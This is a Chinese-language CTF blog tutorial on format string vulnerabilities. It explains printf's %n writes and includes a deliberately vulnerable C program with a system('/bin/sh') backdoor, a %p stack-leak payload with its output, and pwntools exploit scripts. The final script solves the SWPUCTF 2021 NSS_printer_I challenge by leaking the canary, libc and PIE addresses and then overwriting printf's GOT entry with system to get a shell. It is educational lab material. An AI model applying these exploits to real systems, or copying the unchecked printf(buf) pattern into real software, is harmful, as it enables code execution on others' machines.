<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>格式化字符串漏洞 | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>格式化字符串漏洞</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-08-01T11:45:14.000Z" id="date"> 2023-08-01</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-08-25T09:16:14.545Z" id="updated"> 2023-08-25</time></div></span></div></div><hr><div id="post-content"><p><em>在你的内存刻上奇怪的符号</em></p>
<p><strong>函数原型</strong><br>printf (“格式化字符串”,参量… )<br>函数的返回值是正确输出的字符的个数，如果输出失败，返回负值。<br>参量表中参数的个数是不定的（如何实现参数的个数不定，可以参考《程序员的自我修养》这本书），可以是一个，可以是两个，三个…，也可以没有参数。<br>printf函数的格式化字符串常见的有 %d，%f，%c，%s，%x（输出16进制数，前面没有0x），%p（输出16进制数，前面带有0x）等等。<br>但是有个不常见的格式化字符串 %n ，它的功能是将%n之前打印出来的字符个数，赋值给一个变量。</p>
<p>除了%n,还有%hn，%hhn，%lln，分别为写入目标空间2字节，1字节，8字节。 注意是对应参数（这个参数是指针）的对应的地址开始起几个字节。不要觉得%lln，取的是8个字节的指针，%n取的就是4个字节的指针，取的是多少字节的指针只跟程序的位数有关，如果是32位的程序，%n取的就是4字节指针，64位取的就是8字节指针，这是因为不同位数的程序，每个参数对应的字节数是不同的。<br>接下来写个程序看看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc -no-pie test.c -fno-stack-protector  -z execstack -o test</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> d = <span class="hljs-number">1</span>;   <span class="hljs-comment">//fmt1</span><br><span class="hljs-type">char</span> x[] =<span class="hljs-string">&quot;/bin/sh&quot;</span><br><br><span class="hljs-type">int</span> main()<br>&#123;<br>  <span class="hljs-type">int</span> n=<span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;aaaaa%n\n&quot;</span>,&amp;n);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,n);		<br>  	<br>  <span class="hljs-type">int</span> a=<span class="hljs-number">114</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,a);<br>  <br>  <span class="hljs-type">char</span> b[]=<span class="hljs-string">&quot;str1k3&quot;</span>;<br>  <span class="hljs-built_in">printf</span>(b);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  <br>  <span class="hljs-type">char</span> c[<span class="hljs-number">256</span>];<br>  read(<span class="hljs-number">0</span>,c,<span class="hljs-number">0x64</span>);  <span class="hljs-comment">//fmt</span><br>  <span class="hljs-built_in">printf</span>(c);<br>  <span class="hljs-built_in">puts</span>(x);    <span class="hljs-comment">//fmt2</span><br><br>  <span class="hljs-keyword">if</span>(d==<span class="hljs-number">0</span>)<br>  &#123; <br>  backdoor();<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span><br>&#123;<br> <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting program: /home/str1k3/Desktop/test <br>aaaaa<br>5<br>114<br>str1k3<br>aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p<br>aaaaaaaa-0xa-(nil)-(nil)-0xa-0x7c-0x6161616161616161-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x7025-0x401090-0x336b3172747320[Inferior 1 (process 14255) exited normally]<br></code></pre></td></tr></table></figure>
<p>如果我们只传入了格式化字符串而没有传入参数</p>
<p>那么格式化字符串仍然会遵循着原先的逻辑，向高地址处逐个字长的输出当前栈的内容&#x2F;指针(输出的方式根据其格式化字符的不同而不同)</p>
<p>这是因为printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束</p>
<p>pwntools已集成格式化字符串漏洞攻击方式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./test&#x27;</span>)<br>elf =ELF(<span class="hljs-string">&#x27;./test&#x27;</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt1</span>():<br>  p.recv()<br>  payload=fmtstr_payload(<span class="hljs-number">6</span>,&#123;<span class="hljs-number">0x404048</span>:<span class="hljs-number">0</span>&#125;)    <span class="hljs-comment">#把d改为0</span><br>  p.sendline(payload)<br>  p.interactive()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt2</span>():<br>  p.recv()<br>  payload=fmtstr_payload(<span class="hljs-number">6</span>,&#123;elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]:elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]&#125;) <span class="hljs-comment">#把read改为system，执行/bin/sh</span><br>  p.sendline(payload)<br>  p.interactive()<br><br><span class="hljs-comment">#fmt1()</span><br>fmt2()<br></code></pre></td></tr></table></figure>
<p>下面放一道综合一点的题<br><strong>[SWPUCTF 2021 新生赛]NSS_printer_I</strong><br>checksec</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/str1k3/.cache/vmware/drag_and_drop/3CJjqN/NSS_printer&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">104</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+68h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  init();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;======================================&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;=====welcone to use NSS printer!======&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input what you want to say: &quot;</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x64</span>uLL);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you said:&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(buf);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>保护全开。存在格式化字符串漏洞，考虑内存任意写改got表。开了pie，可利用地址相对位置不变，地址后三位不变的特性绕过。<br>最终想法是把printf改成system，然后通过手动输入&#x2F;bin&#x2F;sh来拿到shell</p>
<p>用上文的测试方式：aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p<br>可调试得：<br>偏移：6<br>11（_start）+ 6 &#x3D; 17   #有些师傅用的这个来算基址<br>13（canary）+ 6（偏移） &#x3D; 19（真实地址）<br>15（__libc_start_main）+6（偏移） &#x3D; 21（真实地址）<br>19（main）+6（偏移） &#x3D; 25（真实地址）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./NSS_printer&#x27;</span>)<br><span class="hljs-comment">#p = remote(&#x27;node1.anna.nssctf.cn&#x27;, 28831)</span><br>elf = ELF(<span class="hljs-string">&#x27;./NSS_printer&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br>payload1 = <span class="hljs-string">&quot;%19$p..%21$p-%25$p&quot;</span><br>p.recvuntil(<span class="hljs-string">&quot;input what you want to say: &quot;</span>)<br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&#x27;you said:&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;canary_addr&#x27;</span>,<span class="hljs-built_in">hex</span>(canary))<br><br>p.recvuntil(<span class="hljs-string">&#x27;..&#x27;</span>)<br>libc_start_main = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">240</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_start_main&#x27;</span>,<span class="hljs-built_in">hex</span>(libc_start_main))<br><br>p.recvuntil(<span class="hljs-string">&#x27;-&#x27;</span>)<br>elf_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0xA14</span>  <span class="hljs-comment">#main函数的偏移</span><br>printf_addr = elf_base+elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;elf_base&#x27;</span>,<span class="hljs-built_in">hex</span>(elf_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;printf_addr&#x27;</span>,<span class="hljs-built_in">hex</span>(printf_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>,libc_start_main)<br><br>libc_base = libc_start_main - libc.dump(<span class="hljs-string">&quot;__libc_start_main&quot;</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>bin_addr =  libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_start_main:&#x27;</span>,<span class="hljs-built_in">hex</span>(libc_start_main))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_base:&#x27;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;system_addr:&#x27;</span>,<span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;bin_addr:&#x27;</span>,<span class="hljs-built_in">hex</span>(bin_addr))<br><br>payload = fmtstr_payload(<span class="hljs-number">6</span>,&#123;printf_addr:system_addr&#125;,write_size=<span class="hljs-string">&#x27;short&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>p.recvuntil(<span class="hljs-string">&quot;input what you want to say: &quot;</span>)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/08/10/ROPgadget/">← 下一篇 ROPgadget</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/08/01/%E6%8B%BF%E4%B8%8D%E5%88%B0shell%E7%9A%84shellcode/">拿不到shell的shellcode 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/4.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://str1ke4fun.github.io/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>